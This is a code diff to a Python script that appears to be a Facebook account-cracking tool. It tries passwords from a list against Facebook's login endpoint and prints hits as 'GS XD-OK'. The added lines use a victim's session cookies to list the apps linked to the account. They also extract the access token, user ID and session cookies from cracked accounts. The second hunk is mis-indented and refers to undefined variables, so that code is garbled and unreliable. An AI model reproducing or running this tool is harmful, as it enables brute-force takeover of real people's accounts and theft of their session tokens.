@@ -258,7 +258,27 @@ E = '\x1b[1;93m'
 F = '\x1b[1;94m'
 G = '\x1b[1;95m'
 P = '\033[1;91m'
-
+def cek_apk(session,coki):
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=active",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sActive Apks & Web Not Found %s		'%(N,H,N,H,N))
+	else:
+		print(f'\r{A} [GS XD>]%s Active Apks & Web ðŸ‘‡ '%(H))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(D,i+1,game[i].replace("Ditambahkan pada"," Ditambahkan pada"),D))
+	w=session.get("https://mbasic.facebook.com/settings/apps/tabbed/?tab=inactive",cookies={"cookie":coki}).text
+	sop = BeautifulSoup(w,"html.parser")
+	x = sop.find("form",method="post")
+	game = [i.text for i in x.find_all("h3")]
+	if len(game)==0:
+		print(f'\r%s [%sâ€¢%s] %sExpired Apks & Web Not Found %s		'%(N,M,N,M,N))
+	else:
+		print(f'\r{A} [â€¢]%s Expired Apks & Web ðŸ‘‡ '%(M))
+		for i in range(len(game)):
+			print(f"\r%s [%s] %s %s "%(C,i+1,game[i].replace("Kedaluwarsa"," Kedaluwarsa"),A))
 loop=0
 oks=[]
 cps=[]
@@ -927,6 +947,19 @@ def ffb(ids,names,passlist):
 			complete = session.post('https://p.facebook.com/login/device-based/validate-password/?shbl=0',data=idpass,allow_redirects=False,headers=head)
 			AXI=session.cookies.get_dict().keys()
 			if "c_user" in AXI:
+				try:
+                        used=str(q['uid'])
+                        tokic=str(q['access_token'])
+                    except:
+                        used=user
+                        tokic='lol'
+                    if used in ok or used in tl:
+                        break
+                    coki = []
+                    for x in q['session_cookies']:
+                        coki.append(x['name']+'='+x['value']+';')
+                    cokie = coki[3]+coki[2]+coki[0]+coki[1]
+                    try:
 				coki=session.cookies.get_dict()
 				kuki = (";").join([ "%s=%s" % (key, value) for key, value in session.cookies.get_dict().items() ])
 				print('\r\r\033[1;32m [GS XD-OK] %s | %s'%(ids,pas))
@@ -1611,4 +1644,3 @@ if __name__=='__main__':
     except:pass
     #approval()
     menu()
-    
